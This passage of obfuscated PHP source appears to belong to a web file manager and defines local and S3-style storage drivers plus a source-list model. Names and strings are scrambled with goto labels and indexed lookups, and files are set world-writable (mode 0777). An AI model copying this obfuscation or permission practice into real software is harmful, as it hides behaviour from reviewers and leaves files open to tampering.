$B¬˜ÕÌêÄ‡); if (!$DŸ‚š”„…‚) { return !1; } $this->pathParse[$f§ÑÔ…Ê¹¾[1055]] = $DŸ‚š”„…‚[$f§ÑÔ…Ê¹¾[395]]; } return $this->infoParse($E»»óÙÙºÇ); } public function listAll($EµíŸá†µ‘) { goto EŸÌÏÅö¿Ø; fˆùƒäø•: foreach ($F¬¯³Ñ…Â¤ as &$fŠÆøßä) { check_abort(); $fŠÆøßä[$cŒŒ‚à§„[85]] = $DÆã«íÌÜ->_shareItemeParse($fŠÆøßä[$cŒŒ‚à§„[85]], $d·ÂöÃÜµ); } unset($fŠÆøßä); return $F¬¯³Ñ…Â¤; goto C²Õ’‘²®; EŸÌÏÅö¿Ø: $cŒŒ‚à§„ =& $_SERVER[ÒÆ›ÆØÎ¾]; $b×£¬½àÏ = IO::info($this->pathParse[$cŒŒ‚à§„[76]]); if (!$b×£¬½àÏ) { return array(); } goto B÷Õ–Í¼ï§; B÷Õ–Í¼ï§: $F¬¯³Ñ…Â¤ = $this->model->listAll($EµíŸá†µ‘); $d·ÂöÃÜµ = Model($cŒŒ‚à§„[563])->getInfo($b×£¬½àÏ[$cŒŒ‚à§„[468]]); $DÆã«íÌÜ = Action($cŒŒ‚à§„[1205]); goto fˆùƒäø•; C²Õ’‘²®: } } goto F°ÄâÅ‡¿; b¢é‹¬ŠÙø: class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($A†¦Âïæƒ™) { if (substr($A†¦Âïæƒ™, 0, 2) == $_SERVER[ÒÆ›ÆØÎ¾][1236]) { $A†¦Âïæƒ™ = BASIC_PATH . substr($A†¦Âïæƒ™, 2); } return $A†¦Âïæƒ™; } public function iconvApp($C‡Œ¦¹ã–») { $dªÙñ»‡Ğ± =& $_SERVER[ÒÆ›ÆØÎ¾]; global $config; return $this->iconvTo($C‡Œ¦¹ã–», $config[$dªÙñ»‡Ğ±[1234]], $config[$dªÙñ»‡Ğ±[1233]]); } public function iconvSystem($cëèƒÍæÈ¨) { $c†ç­£Ê”µ =& $_SERVER[ÒÆ›ÆØÎ¾]; global $config; return $this->iconvTo($cëèƒÍæÈ¨, $config[$c†ç­£Ê”µ[1233]], $config[$c†ç­£Ê”µ[1234]]); } public function getPathOuter($E¨¿­‹áÖ”) { goto d±¨Éª÷‚¸; dëÍ¼â™¹: return $this->pathDriver . $aóÔäÚ„©[8] . ltrim($E¨¿­‹áÖ”, $aóÔäÚ„©[8]); goto Dæª˜ÑÖù; d§Àëä»¤: $E¨¿­‹áÖ” = KodIO::clear($E¨¿­‹áÖ”); $E¨¿­‹áÖ” = substr($E¨¿­‹áÖ”, strlen($aìíªˆ´×)); if (empty($this->pathDriver)) { return $E¨¿­‹áÖ”; } goto dëÍ¼â™¹; AÏ¡³‰õ˜: if (substr($aìíªˆ´×, 0, 2) == $aóÔäÚ„©[1236]) { $aìíªˆ´× = BASIC_PATH . substr($aìíªˆ´×, 2); } if (substr($E¨¿­‹áÖ”, 0, 2) == $aóÔäÚ„©[1236]) { $E¨¿­‹áÖ” = BASIC_PATH . substr($E¨¿­‹áÖ”, 2); } $aìíªˆ´× = KodIO::clear($aìíªˆ´×); goto d§Àëä»¤; d±¨Éª÷‚¸: $aóÔäÚ„© =& $_SERVER[ÒÆ›ÆØÎ¾]; $aìíªˆ´× = $this->iconvApp($this->pathBase); $E¨¿­‹áÖ” = $this->iconvApp($E¨¿­‹áÖ”); goto AÏ¡³‰õ˜; Dæª˜ÑÖù: } public function mkfile($BÚ…¤Ì±¥¦, $E²…Œô—áÂ = '', $C¹‡‚Á‚Š = REPEAT_RENAME) { $BÚ…¤Ì±¥¦ = $this->iconvSystem($BÚ…¤Ì±¥¦); @touch($BÚ…¤Ì±¥¦); if ($E²…Œô—áÂ) { file_put_contents($BÚ…¤Ì±¥¦, $E²…Œô—áÂ); } @chmod($BÚ…¤Ì±¥¦, 511); return is_file($BÚ…¤Ì±¥¦) ? $this->getPathOuter($BÚ…¤Ì±¥¦) : !1; } public function mkdir($c½³ïÄÖ§­, $FµÎ—ª—µ¦ = REPEAT_SKIP) { $c½³ïÄÖ§­ = $this->iconvSystem($c½³ïÄÖ§­); if (is_dir($c½³ïÄÖ§­)) { return $this->getPathOuter($c½³ïÄÖ§­); } @mkdir($c½³ïÄÖ§­, 511, !0); @chmod($c½³ïÄÖ§­, 511); return is_dir($c½³ïÄÖ§­) ? $this->getPathOuter($c½³ïÄÖ§­) : !1; } public function copyFile($cìÖ•ğˆøå, $C¯¨ã÷ì) { $this->mkdir($this->pathFather($C¯¨ã÷ì)); $cìÖ•ğˆøå = $this->iconvSystem($cìÖ•ğˆøå); $C¯¨ã÷ì = $this->iconvSystem($C¯¨ã÷ì); $aŠ‹âó‡ò = copy_64($cìÖ•ğˆøå, $C¯¨ã÷ì); @chmod($C¯¨ã÷ì, 511); return $aŠ‹âó‡ò ? $this->getPathOuter($C¯¨ã÷ì) : !1; } public function moveFile($A™ƒå·Ùù, $aÖ»·šğóÇ) { goto F°¢£å¡ÚÅ; F°¢£å¡ÚÅ: $this->mkdir($this->pathFather($aÖ»·šğóÇ)); $A™ƒå·Ùù = $this->iconvSystem($A™ƒå·Ùù); $aÖ»·šğóÇ = $this->iconvSystem($aÖ»·šğóÇ); goto AŸà‘Ô­; a¼Œ‡ÍØŞ¥: return $Eš©•”ƒ ? $this->getPathOuter($aÖ»·šğóÇ) : !1; goto B¦ˆëóÃ…ì; AŸà‘Ô­: $Eš©•”ƒ = intval(@rename($A™ƒå·Ùù, $aÖ»·šğóÇ)); if (!$Eš©•”ƒ) { if ($Eš©•”ƒ = intval(@copy_64($A™ƒå·Ùù, $aÖ»·šğóÇ))) { @unlink($A™ƒå·Ùù); } } @chmod($aÖ»·šğóÇ, 511); goto a¼Œ‡ÍØŞ¥; B¦ˆëóÃ…ì: } public function delFile($a°Î—óéÙ£) { $a°Î—óéÙ£ = $this->iconvSystem($a°Î—óéÙ£); if (!@unlink($a°Î—óéÙ£)) { @chmod($a°Î—óéÙ£, 511); if (!@unlink($a°Î—óéÙ£)) { return !1; } } else { return !0; } } public function delFolder($c‘é©‰Š²Ã) { goto bõ‡ èåÛ‹; Aéòµ¨äÊ›: return rmdir($c‘é©‰Š²Ã); goto dó„Äóåö‹; bõ‡ èåÛ‹: $f³ÜÖö¡Ş =& $_SERVER[ÒÆ›ÆØÎ¾]; $c‘é©‰Š²Ã = $this->iconvSystem($c‘é©‰Š²Ã); if (!is_dir($c‘é©‰Š²Ã)) { return !0; } goto e¼Ş­Ÿ¬†¯; e¼Ş­Ÿ¬†¯: if (!($dß‰ÑĞó´ä = opendir($c‘é©‰Š²Ã))) { return !1; } while (($F ¦ªÑ…¹Ÿ = readdir($dß‰ÑĞó´ä)) !== !1) { if ($F ¦ªÑ…¹Ÿ == $f³ÜÖö¡Ş[95] || $F ¦ªÑ…¹Ÿ == $f³ÜÖö¡Ş[1243]) { continue; } $fÄç›¨»¤÷ = $c‘é©‰Š²Ã . $f³ÜÖö¡Ş[8] . $F ¦ªÑ…¹Ÿ; if (is_file($fÄç›¨»¤÷) || is_link($fÄç›¨»¤÷)) { if (!unlink($fÄç›¨»¤÷)) { chmod($fÄç›¨»¤÷, 511); if (!unlink($fÄç›¨»¤÷)) { return !1; } } } else { if (is_dir($fÄç›¨»¤÷)) { chmod($fÄç›¨»¤÷, 511); $fÄç›¨»¤÷ = $this->iconvApp($fÄç›¨»¤÷); if (!$this->delFolder($fÄç›¨»¤÷)) { return !1; } } } } closedir($dß‰ÑĞó´ä); goto Aéòµ¨äÊ›; dó„Äóåö‹: } public function rename($fŠ¥êÈª¬, $b¡ÛÁğ…ë‡) { goto b†ò°©Ü‰¯; b†ò°©Ü‰¯: $BÔ˜‰ØÕº± =& $_SERVER[ÒÆ›ÆØÎ¾]; $e§©òçñ˜÷ = $this->fileNameAuto($this->pathFather($fŠ¥êÈª¬), $b¡ÛÁğ…ë‡); $e§©òçñ˜÷ = $this->iconvSystem($e§©òçñ˜÷); goto aöáÀãß‰‘; F‡Öœäºí: $dºšæƒ†íÙ = @rename($fŠ¥êÈª¬, $d’ÚğÁßÎ©); $d’ÚğÁßÎ© = $this->iconvApp($d’ÚğÁßÎ©); return $dºšæƒ†íÙ ? $this->getPathOuter($d’ÚğÁßÎ©) : !1; goto D›ô›‘ìÕŒ; aöáÀãß‰‘: $fŠ¥êÈª¬ = $this->iconvSystem($fŠ¥êÈª¬); $fõóòİ»Ë = $this->pathFather($fŠ¥êÈª¬); $d’ÚğÁßÎ© = rtrim($fõóòİ»Ë, $BÔ˜‰ØÕº±[8]) . $BÔ˜‰ØÕº±[8] . $e§©òçñ˜÷; goto F‡Öœäºí; D›ô›‘ìÕŒ: } public function size($Añ‹ÔÜ«à…) { $Añ‹ÔÜ«à… = $this->iconvSystem($Añ‹ÔÜ«à…); return filesize_64($Añ‹ÔÜ«à…); } public function info($bµ±®„¿¥) { $bµ±®„¿¥ = $this->iconvSystem($bµ±®„¿¥); if ($this->isFolder($bµ±®„¿¥)) { return $this->folderInfo($bµ±®„¿¥); } else { if ($this->isFile($bµ±®„¿¥)) { return $this->fileInfo($bµ±®„¿¥); } } return !1; } protected function infoChildren($eÎÌÚ—§‹å, &$bäêé„Ô—, $A§Ó«¸“á = true) { goto EšŒ×˜Èˆ£; EšŒ×˜Èˆ£: $bà“Ùõ–Î° =& $_SERVER[ÒÆ›ÆØÎ¾]; check_abort_echo(); $eÎÌÚ—§‹å = rtrim($eÎÌÚ—§‹å, $bà“Ùõ–Î°[8]) . $bà“Ùõ–Î°[8]; goto E×‹¥‰Ûß°; E×‹¥‰Ûß°: if ($A§Ó«¸“á) { $eÎÌÚ—§‹å = $this->iconvSystem($eÎÌÚ—§‹å); } if (!($bÇÏŒ¾òñº = @opendir($eÎÌÚ—§‹å))) { return; } while (($fŒµŸß´˜Ë = readdir($bÇÏŒ¾òñº)) !== !1) { if ($fŒµŸß´˜Ë == $bà“Ùõ–Î°[95] || $fŒµŸß´˜Ë == $bà“Ùõ–Î°[1243]) { continue; } $eÏÛ¹³†«ì = $eÎÌÚ—§‹å . $fŒµŸß´˜Ë; if (is_file($eÏÛ¹³†«ì) || is_link($eÏÛ¹³†«ì)) { $bäêé„Ô—[$bà“Ùõ–Î°[79]]++; $bäêé„Ô—[$bà“Ùõ–Î°[78]] += filesize_64($eÏÛ¹³†«ì); } else { if (is_dir($eÏÛ¹³†«ì)) { $bäêé„Ô—[$bà“Ùõ–Î°[80]]++; $this->infoChildren($eÏÛ¹³†«ì, $bäêé„Ô—, !1); } } } goto E‘íÉÈ¤¿„; E‘íÉÈ¤¿„: closedir($bÇÏŒ¾òñº); goto d¬§Šš»µ; d¬§Šš»µ: } private function folderInfo($AêÑºŠ³ÆÆ, $b¹ç¢‚ŸÂ = false) { $c¢¥áÒ =& $_SERVER[ÒÆ›ÆØÎ¾]; $AêÑºŠ³ÆÆ = rtrim($AêÑºŠ³ÆÆ, $c¢¥áÒ[8]) . $c¢¥áÒ[8]; $f¯ëå±Û¦Å = $this->iconvApp($this->pathThis($AêÑºŠ³ÆÆ)); if ($b¹ç¢‚ŸÂ) { return array($c¢¥áÒ[28] => $f¯ëå±Û¦Å, $c¢¥áÒ[76] => $this->getPathOuter($AêÑºŠ³ÆÆ), $c¢¥áÒ[29] => $c¢¥áÒ[77]); } $cºî¡ÉŒæ = array($c¢¥áÒ[28] => $f¯ëå±Û¦Å, $c¢¥áÒ[76] => $this->getPathOuter($AêÑºŠ³ÆÆ), $c¢¥áÒ[29] => $c¢¥áÒ[77], $c¢¥áÒ[194] => @filectime($AêÑºŠ³ÆÆ), $c¢¥áÒ[84] => @filemtime($AêÑºŠ³ÆÆ), $c¢¥áÒ[1246] => @fileatime($AêÑºŠ³ÆÆ), $c¢¥áÒ[1247] => is_readable($AêÑºŠ³ÆÆ), $c¢¥áÒ[1248] => is_writable($AêÑºŠ³ÆÆ), $c¢¥áÒ[1249] => get_mode($AêÑºŠ³ÆÆ)); return $cºî¡ÉŒæ; } private function fileInfo($B¹Šç©ŠÀø, $E×›Šç¥Ş = false) { $AÓ”‘Ò±ì =& $_SERVER[ÒÆ›ÆØÎ¾]; $E©§“àÊ¤Ä = $this->iconvApp($this->pathThis($B¹Šç©ŠÀø)); if ($E×›Šç¥Ş) { return array($AÓ”‘Ò±ì[28] => $E©§“àÊ¤Ä, $AÓ”‘Ò±ì[76] => $this->getPathOuter($B¹Šç©ŠÀø), $AÓ”‘Ò±ì[29] => $AÓ”‘Ò±ì[193], $AÓ”‘Ò±ì[78] => $this->size($B¹Šç©ŠÀø), $AÓ”‘Ò±ì[168] => $this->ext($E©§“àÊ¤Ä)); } $eÑê§¥ó¥ = array($AÓ”‘Ò±ì[28] => $E©§“àÊ¤Ä, $AÓ”‘Ò±ì[76] => $this->getPathOuter($B¹Šç©ŠÀø), $AÓ”‘Ò±ì[29] => $AÓ”‘Ò±ì[193], $AÓ”‘Ò±ì[194] => @filectime($B¹Šç©ŠÀø), $AÓ”‘Ò±ì[84] => @filemtime($B¹Šç©ŠÀø), $AÓ”‘Ò±ì[1246] => @fileatime($B¹Šç©ŠÀø), $AÓ”‘Ò±ì[78] => $this->size($B¹Šç©ŠÀø), $AÓ”‘Ò±ì[168] => $this->ext($E©§“àÊ¤Ä), $AÓ”‘Ò±ì[1247] => is_readable($B¹Šç©ŠÀø), $AÓ”‘Ò±ì[1248] => is_writable($B¹Šç©ŠÀø), $AÓ”‘Ò±ì[1249] => get_mode($B¹Šç©ŠÀø)); return $eÑê§¥ó¥; } public function exist($fÁ¸©àò¢÷) { $fÁ¸©àò¢÷ = $this->iconvSystem($fÁ¸©àò¢÷); return @file_exists($fÁ¸©àò¢÷); } public function isFile($aß…Ô—›÷×) { $aß…Ô—›÷× = $this->iconvSystem($aß…Ô—›÷×); return @is_file($aß…Ô—›÷×); } public function isFolder($B‡™ßĞÈÑ’) { $B‡™ßĞÈÑ’ = $this->iconvSystem($B‡™ßĞÈÑ’); return @is_dir($B‡™ßĞÈÑ’); } public function listPath($Aˆ¥¸ôìÖ, $dÓ‘•”ï¶ = false) { goto f–†ö²êÖå; c­†ÊóÊÔ: closedir($c…é„Î†); return $f‰Ãí©’ã¥; goto D§”«æ—±Ì; cŸ„÷§™¸˜: $f‰Ãí©’ã¥ = array($C¼ÂÑ“Ä®„[75] => array(), $C¼ÂÑ“Ä®„[74] => array()); if (!($c…é„Î† = @opendir($Aˆ¥¸ôìÖ))) { return $f‰Ãí©’ã¥; } while (($Aôî…â˜¬ = readdir($c…é„Î†)) !== !1) { if ($Aôî…â˜¬ == $C¼ÂÑ“Ä®„[95] || $Aôî…â˜¬ == $C¼ÂÑ“Ä®„[1243]) { continue; } $F—…“º’ = $Aˆ¥¸ôìÖ . $Aôî…â˜¬; if (is_file($F—…“º’)) { $f‰Ãí©’ã¥[$C¼ÂÑ“Ä®„[74]][] = $this->fileInfo($F—…“º’, $dÓ‘•”ï¶); } else { $f‰Ãí©’ã¥[$C¼ÂÑ“Ä®„[75]][] = $this->folderInfo($F—…“º’, $dÓ‘•”ï¶); } } goto c­†ÊóÊÔ; f–†ö²êÖå: $C¼ÂÑ“Ä®„ =& $_SERVER[ÒÆ›ÆØÎ¾]; $Aˆ¥¸ôìÖ = $this->iconvSystem($Aˆ¥¸ôìÖ); $Aˆ¥¸ôìÖ = rtrim($Aˆ¥¸ôìÖ, $C¼ÂÑ“Ä®„[8]) . $C¼ÂÑ“Ä®„[8]; goto cŸ„÷§™¸˜; D§”«æ—±Ì: } public function listAll($fÈ÷»ÌÈ¼£, &$F‚£÷…»ˆÌ = array()) { goto fÄâ‹Ñœè„; fÚ°Å½ÆØõ: if (!($a²Óäåğ¢° = @opendir($fÈ÷»ÌÈ¼£))) { return $F‚£÷…»ˆÌ; } while (($E•ë®‚…• = readdir($a²Óäåğ¢°)) !== !1) { if ($E•ë®‚…• == $B«ºŞ“ê‹Ä[95] || $E•ë®‚…• == $B«ºŞ“ê‹Ä[1243]) { continue; } $fÇÆÌ°•ìò = $fÈ÷»ÌÈ¼£ . $E•ë®‚…•; if (is_dir($fÇÆÌ°•ìò) && !is_link($fÇÆÌ°•ìò)) { $F‚£÷…»ˆÌ[] = array($B«ºŞ“ê‹Ä[76] => $fÇÆÌ°•ìò . $B«ºŞ“ê‹Ä[8], $B«ºŞ“ê‹Ä[77] => 1, $B«ºŞ“ê‹Ä[84] => @filemtime($fÇÆÌ°•ìò), $B«ºŞ“ê‹Ä[78] => 0); $this->listAll($fÇÆÌ°•ìò, $F‚£÷…»ˆÌ); } else { $F‚£÷…»ˆÌ[] = array($B«ºŞ“ê‹Ä[76] => $fÇÆÌ°•ìò, $B«ºŞ“ê‹Ä[77] => 0, $B«ºŞ“ê‹Ä[84] => @filemtime($fÇÆÌ°•ìò), $B«ºŞ“ê‹Ä[78] => $this->size($fÇÆÌ°•ìò)); } } closedir($a²Óäåğ¢°); goto AÛ¬íÄß; AÛ¬íÄß: return $F‚£÷…»ˆÌ; goto aŒİ…´ŞÒŠ; fÄâ‹Ñœè„: $B«ºŞ“ê‹Ä =& $_SERVER[ÒÆ›ÆØÎ¾]; $fÈ÷»ÌÈ¼£ = $this->iconvSystem($fÈ÷»ÌÈ¼£); $fÈ÷»ÌÈ¼£ = rtrim($fÈ÷»ÌÈ¼£, $B«ºŞ“ê‹Ä[8]) . $B«ºŞ“ê‹Ä[8]; goto fÚ°Å½ÆØõ; aŒİ…´ŞÒŠ: } public function has($f¼éñ—»ø, $eâ´‰Úé…Ş = false, $AÛÏ»‘À§ = true) { goto a“Ú²é°êÅ; BÙ¶ã‹Àˆˆ: if ($eâ´‰Úé…Ş) { return array($CËÙ‡ÁÓ®Å[203] => $Bäçğ¦î©À, $CËÙ‡ÁÓ®Å[204] => $b¨§¦óÁ­); } return !1; goto aŠ–õĞŒ³; a“Ú²é°êÅ: $CËÙ‡ÁÓ®Å =& $_SERVER[ÒÆ›ÆØÎ¾]; $f¼éñ—»ø = $this->iconvSystem($f¼éñ—»ø); $f¼éñ—»ø = rtrim($f¼éñ—»ø, $CËÙ‡ÁÓ®Å[8]) . $CËÙ‡ÁÓ®Å[8]; goto f¢Íó“ŒËŒ; f¢Íó“ŒËŒ: if (!($bĞ „÷Šà‹ = @opendir($f¼éñ—»ø))) { return !1; } $Bäçğ¦î©À = 0; $b¨§¦óÁ­ = 0; goto A¼Üéâáí×; A¼Üéâáí×: $eÁÚ¯°ÅÑ = 0; while (($AÚùÔÃÍ¹Ç = readdir($bĞ „÷Šà‹)) !== !1) { if ($AÚùÔÃÍ¹Ç == $CËÙ‡ÁÓ®Å[95] || $AÚùÔÃÍ¹Ç == $CËÙ‡ÁÓ®Å[1243]) { continue; } $a­¯îë•Íã = $f¼éñ—»ø . $AÚùÔÃÍ¹Ç; if ($eâ´‰Úé…Ş) { $eÁÚ¯°ÅÑ++; if (@is_file($a­¯îë•Íã)) { $Bäçğ¦î©À++; } else { $b¨§¦óÁ­++; } if ($eÁÚ¯°ÅÑ > 10000) { break; } continue; } if ($AÛÏ»‘À§) { if (@is_file($a­¯îë•Íã)) { return !0; } } else { if (@is_dir($a­¯îë•Íã . $CËÙ‡ÁÓ®Å[8])) { return !0; } } } closedir($bĞ „÷Šà‹); goto BÙ¶ã‹Àˆˆ; aŠ–õĞŒ³: } public function hashSimple($c©Ñªëé¯™) { goto CŠáõŠ­òó; Cªñ©‘Ñí¹: $cˆ•«¨ÀĞÓ = $this->size($c©Ñªëé¯™); $cÉ‘ğé°ö¼ = 200; $bìçÉéß¿” = 50; goto B‘õÑŞô¶; Fó°Ì¹ ±„: fseek_64($FñÀöËÛÕè, $cˆ•«¨ÀĞÓ - $cÉ‘ğé°ö¼); $bÚÃØ˜•‘º .= fread($FñÀöËÛÕè, $cÉ‘ğé°ö¼); fclose($FñÀöËÛÕè); goto e—ãÄå‘œ; B‘õÑŞô¶: if ($cˆ•«¨ÀĞÓ <= $cÉ‘ğé°ö¼ * $bìçÉéß¿”) { return $this->hashMd5($c©Ñªëé¯™) . $cˆ•«¨ÀĞÓ; } $bÚÃØ˜•‘º = $a‚ßöÇ«±[33]; $DÛ º¯Ó¦‡ = intval($cˆ•«¨ÀĞÓ / $bìçÉéß¿”); goto bÁöŞ¹Ø°; bÁöŞ¹Ø°: $FñÀöËÛÕè = fopen($c©Ñªëé¯™, $a‚ßöÇ«±[1250]); if (!$FñÀöËÛÕè) { return $bÚÃØ˜•‘º; } for ($E¿¾…³î¿¡ = 0; $E¿¾…³î¿¡ < $bìçÉéß¿”; $E¿¾…³î¿¡++) { fseek_64($FñÀöËÛÕè, $DÛ º¯Ó¦‡ * $E¿¾…³î¿¡); $bÚÃØ˜•‘º .= fread($FñÀöËÛÕè, $cÉ‘ğé°ö¼); } goto Fó°Ì¹ ±„; CŠáõŠ­òó: $a‚ßöÇ«± =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$c©Ñªëé¯™) { return md5($a‚ßöÇ«±[33]); } $c©Ñªëé¯™ = $this->iconvSystem($c©Ñªëé¯™); goto Cªñ©‘Ñí¹; e—ãÄå‘œ: return md5($bÚÃØ˜•‘º) . $cˆ•«¨ÀĞÓ; goto D×õø³†¬µ; D×õø³†¬µ: } public function getContent($e²ô£Ñ•®É) { $e²ô£Ñ•®É = $this->iconvSystem($e²ô£Ñ•®É); return file_get_contents($e²ô£Ñ•®É); } public function setContent($a¶Ê¬‘Ä¬’, $E¼Ã±Ï¿šÍ = '') { $a¶Ê¬‘Ä¬’ = $this->iconvSystem($a¶Ê¬‘Ä¬’); $cÕˆ»ÒÇá‰ = @file_put_contents($a¶Ê¬‘Ä¬’, $E¼Ã±Ï¿šÍ, LOCK_EX); clearstatcache(); @chmod($a¶Ê¬‘Ä¬’, 511); return $cÕˆ»ÒÇá‰ === !1 ? !1 : !0; } public function fileSubstr($dãÉæ¨Õ¸Ş, $e‚‘‘‚ÏåŸ = 0, $B™ôÄ¥± = false) { goto a”Ãö±··Â; a”Ãö±··Â: $Aùèê—ÍÒÄ =& $_SERVER[ÒÆ›ÆØÎ¾]; $dãÉæ¨Õ¸Ş = $this->iconvSystem($dãÉæ¨Õ¸Ş); if ($B™ôÄ¥± === !1) { $B™ôÄ¥± = $this->size($dãÉæ¨Õ¸Ş); } goto Eò¥Âßè¬½; Fáä¸‰³Éé: fseek_64($Cœ®å¢ì”ç, $e‚‘‘‚ÏåŸ); $dÈ·†ƒ¨ä = fread($Cœ®å¢ì”ç, $B™ôÄ¥±); fclose($Cœ®å¢ì”ç); goto eÊÍİ®ä¦„; eÊÍİ®ä¦„: return $dÈ·†ƒ¨ä; goto bÏÓ·ê½™¨; Eò¥Âßè¬½: if ($B™ôÄ¥± <= 0) { return $Aùèê—ÍÒÄ[33]; } $Cœ®å¢ì”ç = fopen($dãÉæ¨Õ¸Ş, $Aùèê—ÍÒÄ[1250]); if (!$Cœ®å¢ì”ç) { return !1; } goto Fáä¸‰³Éé; bÏÓ·ê½™¨: } public function upload($E†ÕÒÔ­Úó, $FÃ…á Š´, $eõˆÇñİ™Ş = false, $a¨Ìì‹Ñ‡¶ = REPEAT_REPLACE) { if ($eõˆÇñİ™Ş) { return $this->moveFile($FÃ…á Š´, $E†ÕÒÔ­Úó); } return $this->copyFile($FÃ…á Š´, $E†ÕÒÔ­Úó); } public function setModifyTime($e÷ò†Ìï£‡, $e‘êêé–³† = '') { @touch($e÷ò†Ìï£‡, intval($e‘êêé–³†)); } public function download($E¨ÔÏğÒÃï, $AõÛ®°äìÇ) { return $this->iconvSystem($E¨ÔÏğÒÃï); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($Dîô³èÆËÔ) { parent::__construct($Dîô³èÆËÔ); $this->signatureVersion($_SERVER[ÒÆ›ÆØÎ¾][212]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($d•½à¸ï…å) { parent::__construct($d•½à¸ï…å); $this->signatureVersion($_SERVER[ÒÆ›ÆØÎ¾][212]); } public function fileOutLink($cğğ­İ†¼) { $a¨ŠÌ¨Ö› =& $_SERVER[ÒÆ›ÆØÎ¾]; if (substr($cğğ­İ†¼, 0, 7) == $a¨ŠÌ¨Ö›[1195]) { $cğğ­İ†¼ = $a¨ŠÌ¨Ö›[1196] . substr($cğğ­İ†¼, 7); } header($a¨ŠÌ¨Ö›[159] . $cğğ­İ†¼); die; } } goto EàÓÏˆ•¥; côì ò¸¢Æ: class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\165\x72\143\145"; protected $tableMeta = array("\x74\141\x62\x6c\x65\x4e\x61\155\145" => "\151\x6f\137\x73\x6f\165\162\143\145\x5f\155\x65\164\141", "\x6d\x65\164\141\106\x69\145\154\144" => "\x73\157\165\x72\143\145\x49\104"); protected $dataAuto = array(array("\155\x6f\144\151\146\x79\124\151\x6d\x65", "\x74\x69\155\145", "\151\x6e\163\145\x72\164", "\x66\165\x6e\x63\x74\151\x6f\156"), array("\x63\x72\145\141\164\x65\x54\x69\x6d\145", "\164\x69\x6d\x65", "\x69\156\163\145\162\x74", "\x66\165\156\x63\x74\x69\157\x6e"), array("\166\x69\x65\x77\124\x69\x6d\145", "\164\151\155\x65", "\151\156\x73\x65\x72\164", "\x66\x75\156\143\x74\x69\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($A›´‹©çî) { return $this->listSource(array($_SERVER[ÒÆ›ÆØÎ¾][394] => $A›´‹©çî)); } public function typeName($aƒß¤ÒÛ³) { static $cğÓ¦Ö†Š = array(self::TYPE_SYSTEM => "\163\x79\x73\x74\x65\155", self::TYPE_USER => "\x75\163\145\162", self::TYPE_GROUP => "\147\x72\157\165\160"); return $cğÓ¦Ö†Š[$aƒß¤ÒÛ³ . $_SERVER[ÒÆ›ÆØÎ¾][33]]; } public function sourceListInfo($aÂê†ŒÓÀ, $E©ó…²Œì‹ = false) { goto B­ˆ•ã¡„Ù; eÊóÖ·Ëò¨: if (!$aÂê†ŒÓÀ) { return array(); } $Eòœùè¥²Í = $this->where(array($Aœ•Ö‹ñ×ƒ[395] => array($Aœ•Ö‹ñ×ƒ[7], $aÂê†ŒÓÀ)))->select(); $this->_listDataApply($Eòœùè¥²Í, $E©ó…²Œì‹); goto f‘ª†“‹Ÿé; B­ˆ•ã¡„Ù: $Aœ•Ö‹ñ×ƒ =& $_SERVER[ÒÆ›ÆØÎ¾]; $aÂê†ŒÓÀ = $aÂê†ŒÓÀ ? $aÂê†ŒÓÀ : array(); $aÂê†ŒÓÀ = array_filter(array_unique($aÂê†ŒÓÀ)); goto eÊóÖ·Ëò¨; f‘ª†“‹Ÿé: return array_to_keyvalue($Eòœùè¥²Í, $Aœ•Ö‹ñ×ƒ[395]); goto a‡åÀÉ³¬­; a‡åÀÉ³¬­: } public function pathInfoFilter(&$c±ùˆñ‡‰) { goto eÎ­°Á´îë; eÎ­°Á´îë: $c››âÇˆÏğ =& $_SERVER[ÒÆ›ÆØÎ¾]; static $f¼–ìŠÉ‡† = false; static $EÆÉê×¡«Ú = false; goto EÎöÑÖÇ–Ÿ; Cé³º‚ÈÃ„: if ($c±ùˆñ‡‰[$c››âÇˆÏğ[403]] != 1) { $c±ùˆñ‡‰[$c››âÇˆÏğ[168]] = $c±ùˆñ‡‰[$c››âÇˆÏğ[405]]; unset($c±ùˆñ‡‰[$c››âÇˆÏğ[405]]); } $e÷â§ÀÕÁ = $f¼–ìŠÉ‡†; if (isset($c±ùˆñ‡‰[$c››âÇˆÏğ[406]]) && $c±ùˆñ‡‰[$c››âÇˆÏğ[406]][$c››âÇˆÏğ[407]] == -1) { $e÷â§ÀÕÁ = $EÆÉê×¡«Ú; } goto aÜë§—Œ¿; EÎöÑÖÇ–Ÿ: static $EÊ×‹±àˆ„ = false; if (!$f¼–ìŠÉ‡†) { goto e¯ã‚Ïò©á; e¯ã‚Ïò©á: $eß‹ŠĞ“”Ú = $c››âÇˆÏğ[396]; $eß‹ŠĞ“”Ú .= $c››âÇˆÏğ[397]; $eß‹ŠĞ“”Ú .= $c››âÇˆÏğ[398]; goto d¸‹ŸÁ¾º; fùœñîŠ®: $EÆÉê×¡«Ú = array(); foreach ($f¼–ìŠÉ‡† as $dõ¯ôÏäğ·) { if (in_array($dõ¯ôÏäğ·, $d¥£Ú‹˜Ø¤)) { continue; } $EÆÉê×¡«Ú[] = $dõ¯ôÏäğ·; } $EÊ×‹±àˆ„ = explode($c››âÇˆÏğ[47], $c››âÇˆÏğ[400]); goto B†§øŠ‰µ; d¸‹ŸÁ¾º: $Eö—¬ˆµ = $c››âÇˆÏğ[399]; $d¥£Ú‹˜Ø¤ = explode($c››âÇˆÏğ[47], $Eö—¬ˆµ); $f¼–ìŠÉ‡† = explode($c››âÇˆÏğ[47], $eß‹ŠĞ“”Ú); goto fùœñîŠ®; B†§øŠ‰µ: } foreach ($EÊ×‹±àˆ„ as $DÎÈ±Ó…çÕ) { if (isset($c±ùˆñ‡‰[$DÎÈ±Ó…çÕ])) { $c±ùˆñ‡‰[$DÎÈ±Ó…çÕ] = intval($c±ùˆñ‡‰[$DÎÈ±Ó…çÕ]); } } goto dª§åñˆˆ£; aÜë§—Œ¿: $c±ùˆñ‡‰ = array_field_key($c±ùˆñ‡‰, $e÷â§ÀÕÁ); return $c±ùˆñ‡‰; goto fŸøëª”™; dª§åñˆˆ£: $c±ùˆñ‡‰[$c››âÇˆÏğ[76]] = $c››âÇˆÏğ[401] . 